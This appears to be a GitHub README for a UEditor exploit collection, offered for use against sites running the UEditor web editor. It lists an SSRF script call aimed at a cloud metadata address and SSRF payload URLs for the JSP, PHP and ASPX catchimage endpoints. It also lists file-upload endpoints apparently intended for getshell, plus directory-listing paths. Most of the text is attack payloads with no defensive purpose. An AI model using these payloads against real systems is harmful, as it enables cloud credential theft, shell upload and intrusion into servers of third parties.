# ueditor_exp
This is a Compilation of ueditor exps like file upload 、xss 、ssrf 、getshell

ssrf:
python u_ssrf.py http://100.100.100.200/latest/meta-data/
<img width="1209" height="579" alt="image" src="https://github.com/user-attachments/assets/cd4ce304-4a83-4d79-bc70-75294bb520e5" />

JSP：

/jsp/controller.jsp?action=catchimage&source[]=https://www.baidu.com/img/PCtm_d9c8750bed0b3c7d089fa7d55720d6cf.png
/jsp/getRemoteImage.jsp?upfile=action=catchimage&source[]= https://www.baidu.com/img/?.png
/ueditor/jsp/getRemoteImage.jsp?upfile=http://127.0.0.1/favicon.ico?.jpg

PHP：
/ueditor/php/controller.php?action=catchimage&source[]=https://www.baidu.com/img/baidu_jgylogo3.gif
/php/controller.php?action=catchimage&source[]=

ASPX
/ueditor/net/controller.ashx?action=catchimage&source%5B%5D=http%3A%2F%2Fx.x.x.x/1.gif?.aspx

Upload Path：
/ueditor/index.html
/ueditor/asp/controller.asp?action=uploadimage
/ueditor/asp/controller.asp?action=uploadfile
/ueditor/net/controller.ashx?action=uploadimage
/ueditor/net/controller.ashx?action=uploadfile
/ueditor/php/controller.php?action=uploadfile
/ueditor/php/controller.php?action=uploadimage
/ueditor/jsp/controller.jsp?action=uploadfile
/ueditor/jsp/controller.jsp?action=uploadimage

list directory path:
/ueditor/net/controller.ashx?action=listfile
/ueditor/net/controller.ashx?action=listimage

